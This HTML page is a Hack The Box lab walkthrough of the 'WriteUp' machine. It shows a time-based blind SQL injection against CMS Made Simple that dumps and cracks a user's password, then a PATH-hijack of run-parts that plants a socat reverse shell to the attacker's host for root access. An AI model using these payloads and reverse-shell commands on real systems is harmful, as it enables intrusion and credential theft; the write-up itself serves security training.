<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    
    
    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/31_writeup/writeup.jpg" />
    
    
    <meta property="og:title" content="HTB WriteUp" />
    
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HTB WriteUp | jebidiah-anthony</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="HTB WriteUp" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="10.10.10.138 20 pts" />
<meta property="og:description" content="10.10.10.138 20 pts" />
<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html" />
<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html" />
<meta property="og:site_name" content="jebidiah-anthony" />
<script type="application/ld+json">
{"@type":"WebPage","url":"https://jebidiah-anthony.github.io/boxes/31_WriteUp.html","headline":"HTB WriteUp","description":"10.10.10.138 20 pts","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
 
  </head>

  <body>

    <header>
      <div class="container">
        <h1>jebidiah-anthony</h1>
        <h2>write-ups and what not</h2>

	<span>
	  <a href="/">whoami</a> | 
          <a href="/htb.html">htb writeups</a> | 
	  <a href="/ctf.html">ctf writeups</a> | 
	  <a href="/projects.html">projects</a> 
	</span>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="htb-writeup-101010138">HTB WriteUp (10.10.10.138)</h1>

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>
<ul>
  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
    <ul>
      <li><a href="#tcp-port-80">TCP PORT 80</a></li>
    </ul>
  </li>
  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
  <li><a href="#part-4--generate-a-user-shell">PART 4 : GENERATE A USER SHELL</a></li>
  <li><a href="#part-5--privilege-escalation-jkr---root">PART 5 : PRIVILEGE ESCALATION (jkr -&gt; root)</a></li>
</ul>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 15000 <span class="nt">-p-</span> 10.10.10.138
<span class="go">
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  
</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 10.10.10.138
<span class="go">
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
  |   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
  |_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
  80/tcp open  http    Apache httpd 2.4.25 ((Debian))
  | http-robots.txt: 1 disallowed entry 
  |_/writeup/
  |_http-title: Nothing here yet.
</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
</span></code></pre></div></div>
<p><strong>NOTE(S)</strong>:</p>
<ul>
  <li>There exists a <strong><code class="highlighter-rouge">robots.txt</code></strong> file.</li>
</ul>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80">TCP PORT 80</h3>

<p><img src="./screenshots/31_writeup/80_landing_page.png" alt="Landing Page" /></p>

<p>There seems to be a script in place that monitors <strong>40X responses</strong> wchich serves as a DoS protection. This means that any form of bruteforce/dictionary attack to the http service might not work as expected.</p>

<p>There was a mention of a write-up page that is yet to go live but with the site having a DoS protection, running <strong><code class="highlighter-rouge">gobuster</code></strong> or <strong><code class="highlighter-rouge">wfuzz</code></strong> might not be the best option. Luckily, a <strong style="color:orange">robots.txt</strong> file was detected by the <strong><code class="highlighter-rouge">nmap</code></strong> scan earlier:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
</code></pre></div></div>

<p><strong style="color:orange">robots.txt</strong> tells web robots or web crawlers which pages of a site to crawl. This helps for a site’s SEO (Search Engine Optimization). In this case, the directory <strong><code class="highlighter-rouge">/writeup/</code></strong> was disallowed and therefore, should exist. This is probably the write-up page that was mentioned earlier.</p>

<p><img src="./screenshots/31_writeup/80_writeup_page.png" alt="/writeup/" /></p>

<table style="margin:auto; width:90%">
<tr>
<th colspan="2"><strong style="color:red">Wappalyzer</strong></th>
</tr>
<tr>
<td><strong style="color:orange">CMS</strong></td>
<td>CMS Made Simple</td>
</tr>
<tr>
<td><strong style="color:orange">Programming Language</strong></td>
<td>PHP</td>
</tr>
<tr>
<td><strong style="color:orange">Web Server</strong></td>
<td>Apache 2.4.25</td>
</tr>
<tr>
<td><strong style="color:orange">Operating System</strong></td>
<td>Debian</td>
</tr>
</table>

<p>The page just contains write-ups of the retired boxes, <strong>Ypuffy</strong> and <strong>Blue</strong>, but checking <strong style="color:orange">Wappalyzer</strong> that reveals the service running underneath is <strong style="color:orange">CMS Made Simple</strong></p>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<p>There might already be an existing exploit for <strong style="color:orange">CMS Made Simple</strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit CMS | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"made simple"</span>
<span class="go">
  CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)       | exploits/php/remote/46627.rb
  CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                  | exploits/php/webapps/26217.html
  CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                  | exploits/php/webapps/26298.txt
  CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                               | exploits/php/webapps/29272.txt
  CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                   | exploits/php/webapps/29941.txt
  CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                  | exploits/php/webapps/32668.txt
  CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                        | exploits/php/webapps/43889.txt
  CMS Made Simple 1.2 - Remote Code Execution                                              | exploits/php/webapps/4442.txt
  CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                     | exploits/php/webapps/4810.txt
  CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                         | exploits/php/webapps/5600.php
  CMS Made Simple 1.4.1 - Local File Inclusion                                             | exploits/php/webapps/7285.txt
  CMS Made Simple 1.6.2 - Local File Disclosure                                            | exploits/php/webapps/9407.txt
  CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                      | exploits/php/webapps/33643.txt
  CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                         | exploits/php/webapps/11424.txt
  CMS Made Simple 1.7 - Cross-Site Request Forgery                                         | exploits/php/webapps/12009.html
  CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                            | exploits/php/webapps/34299.py
  CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                  | exploits/php/webapps/34068.html
  CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                         | exploits/php/webapps/41997.txt
  CMS Made Simple 2.1.6 - Remote Code Execution                                            | exploits/php/webapps/44192.txt
  CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/44976.py
  CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/45793.py
  CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                          | exploits/php/webapps/39760.txt
  CMS Made Simple &lt; 2.2.10 - SQL Injection                                                 | exploits/php/webapps/46635.py
  CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                         | exploits/php/webapps/34300.py
  CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                    | exploits/php/webapps/34298.py
  CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload           | exploits/php/webapps/46546.py

</span></code></pre></div></div>

<p>The latest unauthenticated standalone exploit available is <strong><code class="highlighter-rouge">SQL Injection</code></strong> for versions <strong><code class="highlighter-rouge">CMS Made Simple &lt; 2.2.10</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/46635.py
<span class="go">  
    Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection
        URL: https://www.exploit-db.com/exploits/46635
       Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
  File Type: Python script, ASCII text executable, with CRLF line terminators

</span></code></pre></div></div>

<p>The exploit calls the functions, <strong><code class="highlighter-rouge">dump_salt()</code></strong>, <strong><code class="highlighter-rouge">dump_username()</code></strong>, <strong><code class="highlighter-rouge">dump_email()</code></strong>, and <strong><code class="highlighter-rouge">dump_password()</code></strong> to extract user credentials in the database. It is done by performing a <strong style="color:red">time-based blind SQL injection</strong> where if the query returned is not null, the system sleeps for some time.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span><span class="n">omitted</span><span class="o">...</span>
<span class="k">def</span> <span class="nf">dump_password</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">flag</span>
    <span class="k">global</span> <span class="n">password</span>
    <span class="k">global</span> <span class="n">output</span>
    <span class="n">ord_password</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">ord_password_temp</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="n">flag</span><span class="p">:</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">dictionary</span><span class="p">)):</span>
            <span class="n">temp_password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">dictionary</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
            <span class="n">ord_password_temp</span> <span class="o">=</span> <span class="n">ord_password</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">dictionary</span><span class="p">[</span><span class="n">i</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="n">beautify_print_try</span><span class="p">(</span><span class="n">temp_password</span><span class="p">)</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="s">"a,b,1,5))+and+(select+sleep("</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">TIME</span><span class="p">)</span> <span class="o">+</span> <span class="s">")+from+cms_users"</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="s">"+where+password+like+0x"</span> <span class="o">+</span> <span class="n">ord_password_temp</span> <span class="o">+</span> <span class="s">"25+and+user_id+like+0x31)+--+"</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">url_vuln</span> <span class="o">+</span> <span class="s">"&amp;m1_idlist="</span> <span class="o">+</span> <span class="n">payload</span>
            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="n">elapsed_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>
            <span class="k">if</span> <span class="n">elapsed_time</span> <span class="o">&gt;=</span> <span class="n">TIME</span><span class="p">:</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
            <span class="n">password</span> <span class="o">=</span> <span class="n">temp_password</span>
            <span class="n">ord_password</span> <span class="o">=</span> <span class="n">ord_password_temp</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">output</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\n</span><span class="s">[+] Password found: '</span> <span class="o">+</span> <span class="n">password</span>
<span class="o">...</span><span class="n">omitted</span><span class="o">...</span>
</code></pre></div></div>

<p>The data are extracted by querying if a string (starting from the first character of the actual string) is a substring of the actual string. This is checked by measuring the response times. If it is greater than or equal to the sleep time, then the query did not return a null value. This is done character by character until the entire character string is returned.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python ./46635.py <span class="nt">--url</span> http://10.10.10.138/writeup/ <span class="nt">--wordlist</span> /usr/share/wordlists/rockyou.txt <span class="nt">--crack</span>
<span class="go">
  [+] Salt for password found: 5a599ef579066807
  [+] Username found: jkr
  [+] Email found: jkr@writeup.htb
  [+] Password found: 62def4866937f08cc13bab43bb14e6f7
  [+] Password cracked: raykayjay9

</span></code></pre></div></div>

<p>The exploit takes a while to run since it is more of a bruteforcing method coupled with the <strong><code class="highlighter-rouge">sleep()</code></strong> function but at least, it worked. It revealed a credential pair for the user, <strong><code class="highlighter-rouge">jkr</code></strong>.</p>

<hr />

<h2 id="part-4--generate-a-user-shell">PART 4 : GENERATE A USER SHELL</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
<span class="go">
</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> 
</span><span class="go">
</span></code></pre></div></div>

<p>Enumerating the system:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-mnor</span>
<span class="go">
  writeup 4.9.0-8-amd64 x86_64 GNU/Linux

</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-e</span> <span class="s2">"sh$"</span>
<span class="go">
  root:x:0:0:root:/root:/bin/bash
  jkr:x:1000:1000:jkr,,,:/home/jkr:/bin/bash

</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span> ~
<span class="go">
  drwxr-xr-x 2 jkr  jkr  4.0K Oct 13 10:28 .
  drwxr-xr-x 3 root root 4.0K Apr 19 04:14 ..
</span><span class="gp">  lrwxrwxrwx 1 root root    9 Apr 19 06:42 .bash_history -&gt;</span><span class="w"> </span>/dev/null
<span class="go">  -rw-r--r-- 1 jkr  jkr   220 Apr 19 04:14 .bash_logout
  -rw-r--r-- 1 jkr  jkr  3.5K Apr 19 04:14 .bashrc
  -rw-r--r-- 1 jkr  jkr   675 Apr 19 04:14 .profile
  -r--r--r-- 1 root root   33 Apr 19 08:43 user.txt

</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">cat</span> ~/user.txt
<span class="go">
  d4e4........................f978

</span></code></pre></div></div>

<hr />

<h2 id="part-5--privilege-escalation-jkr---root">PART 5 : PRIVILEGE ESCALATION (jkr -&gt; root)</h2>

<p>Upload and run <a href="files/31_writeup/pspy64s">pspy64</a> since the service is running on a 64-bit architecture:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
<span class="go">
</span><span class="gp">  pspy64s        100%[====================================================&gt;</span><span class="o">]</span>   1.10M
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>scp ./pspy64s jkr@10.10.10.138:/tmp/pspy64s
<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
<span class="go">
  pspy64s                                                                100% 1129KB

</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">cd</span> /tmp
<span class="go">
</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">/tmp</span>$</span><span class="w"> </span><span class="nb">chmod</span> +x ./pspy64s
<span class="go">
</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">/tmp</span>$</span><span class="w"> </span>./pspy64s
<span class="go">
  pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


       ██▓███    ██████  ██▓███ ▓██   ██▓
      ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
      ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
      ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
      ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
      ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
      ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
      ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                     ░           ░ ░     
                                 ░ ░     

</span></code></pre></div></div>

<p>Connect to another <strong><code class="highlighter-rouge">ssh</code></strong> instance:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
<span class="go">
</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> 
</span><span class="go">
</span></code></pre></div></div>

<p>Checking back on the running <strong><code class="highlighter-rouge">./ppsy64s</code></strong>:</p>

<pre><code class="language-pspy">2019/10/11 11:05:21 CMD: UID=0    PID=2270   | sshd: [accepted]  
2019/10/11 11:05:30 CMD: UID=0    PID=2272   | sshd: jkr [priv]  
2019/10/11 11:05:30 CMD: UID=0    PID=2273   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
2019/10/11 11:05:30 CMD: UID=0    PID=2274   | run-parts --lsbsysinit /etc/update-motd.d 
2019/10/11 11:05:30 CMD: UID=0    PID=2275   | /bin/sh /etc/update-motd.d/10-uname 
2019/10/11 11:05:30 CMD: UID=0    PID=2276   | sshd: jkr [priv]  
2019/10/11 11:05:31 CMD: UID=1000 PID=2277   | sshd: jkr@pts/2   
</code></pre>

<p>The <strong><code class="highlighter-rouge">run-parts</code></strong> binary is run and the weird thing about it is that it is passed through a call on <strong><code class="highlighter-rouge">/usr/bin/env</code></strong> with the <strong><code class="highlighter-rouge">-i</code></strong> (<strong><code class="highlighter-rouge">--ignore-environment</code></strong>) option enabled. The <strong><code class="highlighter-rouge">-i</code></strong> option enables the user to set environment variables from scratch or to create a unique setup when running an executable.</p>

<p>This series of events happens everytime a connection via <strong style="color:orange">ssh</strong> is established.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">env</span> | <span class="nb">grep </span>PATH
<span class="go">
  PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span>find / <span class="nt">-name</span> run-parts <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">
  /bin/run-parts

</span></code></pre></div></div>

<p>The <strong><code class="highlighter-rouge">run-parts</code></strong> binary is located in the <strong><code class="highlighter-rouge">/bin/</code></strong> directory which is already set in the actuale <strong><code class="highlighter-rouge">$PATH</code></strong> environment variable. The one being run when connecting via <strong style="color:orange">ssh</strong> includes <strong><code class="highlighter-rouge">/usr/local/sbin/</code></strong>, <strong><code class="highlighter-rouge">/usr/sbin/</code></strong>, and <strong><code class="highlighter-rouge">/sbin/</code></strong>.</p>

<p>The <strong style="color:orange">PATH</strong> environment variable is useful when running a binary since instead of calling an executable using its absolute path, calling only the executable’s name would suffice.</p>

<p>Maybe the exploit lies on how the environment variable, <strong><code class="highlighter-rouge">$PATH</code></strong>, is set for the <strong><code class="highlighter-rouge">run-parts</code></strong> binary.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span>find / <span class="nt">-type</span> d <span class="nt">-writable</span> 2&gt;/dev/null | <span class="nb">grep </span>bin
<span class="go">
  /usr/local/bin
  /usr/local/sbin

</span></code></pre></div></div>

<p>Both <strong><code class="highlighter-rouge">/usr/local/bin</code></strong> and <strong><code class="highlighter-rouge">/usr/local/sbin</code></strong> are included when calling <strong><code class="highlighter-rouge">run-parts</code></strong> and it’s both writable. It’s possible to create another executable with the same name in either of the aforementioned directories.</p>

<p>Since the <strong><code class="highlighter-rouge">run-parts</code></strong> binary is run with reference to the <strong><code class="highlighter-rouge">$PATH</code></strong> environment variable, then maybe the first occurence (since <strong><code class="highlighter-rouge">/usr/local/bin</code></strong> and <strong><code class="highlighter-rouge">/usr/local/sbin</code></strong> are listed before <strong><code class="highlighter-rouge">/bin</code></strong>) or all occurences of the <strong><code class="highlighter-rouge">run-parts</code></strong> binary found in <strong><code class="highlighter-rouge">$PATH</code></strong> will be executed.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'\x23\x21/bin/sh\nsocat TCP-CONNECT:10.10.15.13:4444 EXEC:sh,pty,stderr,setsid,sigint,sane'</span> <span class="o">&gt;</span> /usr/local/sbin/run-parts
<span class="go">
</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">chmod</span> +x /usr/local/sbin/run-parts
</code></pre></div></div>

<p>Connect again via <strong><code class="highlighter-rouge">ssh</code></strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
<span class="go">
</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> 
</span><span class="go">
</span></code></pre></div></div>

<p>Checking back on the running <strong><code class="highlighter-rouge">./ppsy64s</code></strong>:</p>

<pre><code class="language-pspy">2019/10/11 12:28:54 CMD: UID=0    PID=3735   | sshd: [accepted]
2019/10/11 12:28:54 CMD: UID=0    PID=3736   | sshd: [accepted]  
2019/10/11 12:28:58 CMD: UID=0    PID=3738   | sshd: jkr [priv]  
2019/10/11 12:28:58 CMD: UID=0    PID=3739   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
2019/10/11 12:28:58 CMD: UID=0    PID=3740   | /bin/sh /usr/local/sbin/run-parts --lsbsysinit /etc/update-motd.d 
2019/10/11 12:28:58 CMD: UID=0    PID=3741   | socat TCP-CONNECT:10.10.15.13:4444 EXEC:sh,pty,stderr,setsid,sigint,sane 
</code></pre>

<p>The <strong><code class="highlighter-rouge">run-parts</code></strong> binary was completely overridden and the creted reverse shell executed with <strong><code class="highlighter-rouge">UID=0</code></strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">
  uid=0(root) gid=0(root) groups=0(root)

</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">
  eeba........................7226

</span></code></pre></div></div>

<p>Normally, overriding a binary by writing to another directory listed in the <strong><code class="highlighter-rouge">$PATH</code></strong> variable with the same name wouldn’t work. Every binary invoked is written on a cache which includes its absolute path. But since the <strong><code class="highlighter-rouge">run-parts</code></strong> binary is being executed from scratch with <strong><code class="highlighter-rouge">/usr/bin/env -i</code></strong>, it was possible.</p>

      </section>
    </div>

    
      <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'true', 'auto');
        ga('send', 'pageview');
      </script>
    
  </body>
</html>
